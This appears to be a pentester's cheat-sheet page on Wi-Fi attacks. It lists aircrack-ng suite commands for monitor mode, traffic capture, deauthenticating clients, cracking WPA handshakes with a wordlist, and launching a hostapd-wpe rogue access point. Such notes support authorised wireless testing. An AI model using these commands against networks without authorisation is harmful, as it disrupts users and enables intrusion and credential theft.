# wifi

#plateform/linux #target/remote #cat/RECON #cat/ATTACK #tag/powershell 

## airmon - start interface
```
airmon-ng start wlan0
```

## airodump - listen to everything
```
airodump-ng wlan0mon
```

## airodump - listen to specific SSID
```
airodump-ng --bssid <mac_address> -c <channel> -w <output_file> wlan0mon
```

## aireplay - deauth clients
```
aireplay-ng --deauth 5 -c <client_mac_address> -a <mac_address> wlan0mon
```

## aircrack - crack handshake for PSK
```
aircrack-ng -w <dictionary> <input_file>
```

## hostapd-wpe - launch fake AP
```
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```